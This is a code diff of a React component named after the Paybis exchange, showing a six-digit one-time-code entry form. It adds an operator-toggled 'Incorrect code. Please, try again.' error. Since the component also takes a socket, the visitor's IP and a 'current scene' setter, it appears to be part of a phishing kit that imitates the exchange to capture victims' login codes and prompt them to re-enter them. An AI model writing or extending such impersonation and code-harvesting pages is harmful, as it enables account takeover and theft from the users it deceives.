@@ -6,7 +6,7 @@ import voltar from "../../assets/voltar.svg";
 
 import { useTranslation } from 'react-i18next';
 
-export default function PaybisOTP({ socket, ip,setCenaAtual }) {
+export default function PaybisOTP({ socket, ip,setCenaAtual,mostraOtpErro }) {
   const [otp, setOtp] = useState([]);
   const { t } = useTranslation();
 
@@ -116,7 +116,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
             <form action="" onSubmit={(event) => handleSubmitOtp(event)}>
               <div className="otp">
                 <div className="verification-code-input">
-                  <div className="form-input__wrapper verification-code-input__item">
+                <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
                     <input
                       id=""
                       name="otp1"
@@ -132,7 +132,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       className="form-input__input "
                     ></input>
                   </div>
-                  <div className="form-input__wrapper verification-code-input__item">
+                  <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
                     <input
                       id=""
                       name="otp2"
@@ -147,7 +147,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       className="form-input__input"
                     ></input>
                   </div>
-                  <div className="form-input__wrapper verification-code-input__item">
+                  <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
                     <input
                       id=""
                       name="otp3"
@@ -162,7 +162,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       className="form-input__input"
                     ></input>
                   </div>
-                  <div className="form-input__wrapper verification-code-input__item">
+                  <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
                     <input
                       id=""
                       name="otp4"
@@ -177,7 +177,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       className="form-input__input"
                     ></input>
                   </div>
-                  <div className="form-input__wrapper verification-code-input__item">
+                  <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
                     <input
                       id=""
                       name="otp5"
@@ -192,7 +192,8 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                       className="form-input__input"
                     ></input>
                   </div>
-                  <div className="form-input__wrapper verification-code-input__item">
+                  <div className={`form-input__wrapper verification-code-input__item ${mostraOtpErro ? 'is-invalid' : ''}`}>
+
                     <input
                       id=""
                       name="otp6"
@@ -208,6 +209,10 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
                     ></input>
                   </div>
                 </div>
+                {mostraOtpErro && 
+                  <div className="otp__error">Incorrect code. Please, try again.</div>
+                }
+
                 <div className="resend">
                   <div className="resend">
                     <a href="/" className="btn-link resend">
